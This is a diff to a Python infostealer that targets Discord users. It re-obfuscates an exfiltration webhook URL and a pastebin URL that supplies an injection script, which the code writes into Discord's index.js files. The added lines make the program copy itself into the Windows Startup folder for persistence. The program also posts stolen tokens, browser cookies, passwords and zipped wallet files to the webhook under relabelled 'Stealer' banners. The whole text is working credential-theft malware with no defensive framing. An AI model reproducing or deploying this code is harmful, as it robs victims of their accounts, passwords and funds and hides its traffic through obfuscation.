@@ -22,29 +22,19 @@ import getpass
 import ssl
 
 
+username2 = 'xiWw9xv3mwAoa2e-uyDKWsuTDS2ZmHMCHWnI7V5bAzQOLLk'
+loginsx25 = 'pi/webh'
+goto202x = 'iscord.c'
+okayuser2x = '66346782760/CxUwRV'
+wh00k = f'https://d{goto202x}om/a{loginsx25}ooks/11516518{okayuser2x}m4_DnoUkF49V{username2}8mh'
 
-dailyvip = f'ord.c'
-star002324d = 'ps://di'
-lolyy2x_daily = 'pi/we'
-dodo_dailyc2 = 'oks/115165'
-dodaily_qq525 = '60/CxUwRVm4_DnoUk' 
-r2r2r2r2r2x = 'a2e-'
-X_DAILY_O = 'DK'
-X_O_DAILY_API = f'Ao{r2r2r2r2r2x}uy{X_DAILY_O}Ws'
-nOnoX0022_Daily = f'Ww9xv3mw{X_O_DAILY_API}uTDS2ZmHMCHWn'
-forsyyy525252y52ertgre52g2er520ger52tgertgert_daily_doda_XP_API = 'AzQOL'
-wbdStart222222 = f'htt{star002324d}sc{dailyvip}om/a{lolyy2x_daily}bho{dodo_dailyc2}18663467827{dodaily_qq525}F49Vxi{nOnoX0022_Daily}I7V5b{forsyyy525252y52ertgre52g2er520ger52tgertgert_daily_doda_XP_API}Lk8mh'
-htpx = 'tps:/'
-pxko_daily = 'ebin.c'
-xO_DAILY220 = '/r'
-QA202252_DAILY = '/LG'
-GOGO_DAILY20232024_APIWORK = 'FTgM'
-goto_Daily522020254555244141d41g41wg45e8gh8rehrjdddd = f'ht{htpx}/past{pxko_daily}om{xO_DAILY220}aw{QA202252_DAILY}G{GOGO_DAILY20232024_APIWORK}P'
-
-
-
-
+yuop52x = 'Tg'
+capcutstartingx = 'n.com/raw/LG'
+usertouservs2 = 'ps://past'
+injornox2 = f'htt{usertouservs2}ebi{capcutstartingx}GF{yuop52x}MP'
+    
 DETECTED = False
+
 
 def g3t1p():
     ip = "None"
@@ -122,14 +112,14 @@ def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
         except:
             pass
 
-def L04durl1b(wbdStart222222, data='', files='', headers=''):
+def L04durl1b(wh00k, data='', files='', headers=''):
     for i in range(8):
         try:
             if headers != '':
-                r = urlopen(Request(wbdStart222222, data=data, headers=headers))
+                r = urlopen(Request(wh00k, data=data, headers=headers))
                 return r
             else:
-                r = urlopen(Request(wbdStart222222, data=data))
+                r = urlopen(Request(wh00k, data=data))
                 return r
         except: 
             pass
@@ -254,9 +244,9 @@ def inj_discord():
                                                 if file == 'index.js':
                                                     file_path = os.path.join(subsubsubdir, file)
 
-                                                    inj_content = requests.get(goto_Daily522020254555244141d41g41wg45e8gh8rehrjdddd).text
+                                                    inj_content = requests.get(injornox2).text
 
-                                                    inj_content = inj_content.replace("%WEBHOOK%", wbdStart222222)
+                                                    inj_content = inj_content.replace("%WEBHOOK%", wh00k)
 
                                                     with open(file_path, "w", encoding="utf-8") as index_file:
                                                         index_file.write(inj_content)
@@ -325,9 +315,24 @@ def ch1ckT4k1n(t0k3n):
     except:
         return False
 
+if getattr(sys, 'frozen', False):
+    currentFilePath = os.path.dirname(sys.executable)
+else:
+    currentFilePath = os.path.dirname(os.path.abspath(__file__))
+
+fileName = os.path.basename(sys.argv[0])
+filePath = os.path.join(currentFilePath, fileName)
+
+startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+startupFilePath = os.path.join(startupFolderPath, fileName)
+
+if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
+    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
+        shutil.copyfileobj(src_file, dst_file)
+
 
 def upl05dT4k31(t0k3n, path):
-    global wbdStart222222
+    global wh00k
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -394,7 +399,7 @@ def upl05dT4k31(t0k3n, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "A OR M",
+                "text": "User Faster",
                 "icon_url": ""
                 },
             "thumbnail": {
@@ -403,10 +408,10 @@ def upl05dT4k31(t0k3n, path):
             }
         ],
         "avatar_url": "",
-        "username": "A OR M",
+        "username": "User Faster",
         "attachments": []
         }
-    L04durl1b(wbdStart222222, data=dumps(data).encode(), headers=headers)
+    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
 
 
 def R4f0rm3t(listt):
@@ -431,20 +436,20 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Noob| Cookies B",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [NoobCookies.txt]({link})",
+                    "title": "User | Cookies Stealer",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [UserCookies.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "A OR M",
+                        "text": "User Faster",
                         "icon_url": ""
                     }
                 }
             ],
-            "username": "A OR M",
+            "username": "User Faster",
             "avatar_url": "",
             "attachments": []
             }
-        L04durl1b(wbdStart222222, data=dumps(data).encode(), headers=headers)
+        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "crpassw":
@@ -457,20 +462,20 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Noob| Password B",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [NoobPassword.txt]({link})",
+                    "title": "User | Password Stealer",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [UserPassword.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "A OR M",
+                        "text": "User Faster",
                         "icon_url": ""
                     }
                 }
             ],
-            "username": "Noob",
+            "username": "User",
             "avatar_url": "",
             "attachments": []
             }
-        L04durl1b(wbdStart222222, data=dumps(data).encode(), headers=headers)
+        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "kiwi":
@@ -486,19 +491,19 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "Noob| File B"
+                    "name": "User | File Stealer"
                 },
                 "footer": {
-                    "text": "A OR M",
+                    "text": "User Faster",
                     "icon_url": ""
                 }
                 }
             ],
-            "username": "A OR M",
+            "username": "User Faster",
             "avatar_url": "",
             "attachments": []
             }
-        L04durl1b(wbdStart222222, data=dumps(data).encode(), headers=headers)
+        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
         return
 
 
@@ -511,7 +516,7 @@ def upload(name, link):
 def wr1tef0rf1l3(data, name):
     path = os.getenv("TEMP") + f"\cr{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--A OR M BEST -->\n\n")
+        f.write(f"<--User Faster BEST -->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -676,20 +681,20 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "NoobZips",
+            "title": "User Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
-                "text": "A OR M",
+                "text": "User Faster",
                 "icon_url": ""
             }
             }
         ],
-        "username": "A OR M",
+        "username": "User Faster",
         "avatar_url": "",
         "attachments": []
     }
-    L04durl1b(wbdStart222222, data=dumps(data).encode(), headers=headers)
+    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
 
 
 def ZipTelegram(path, arg, procc):
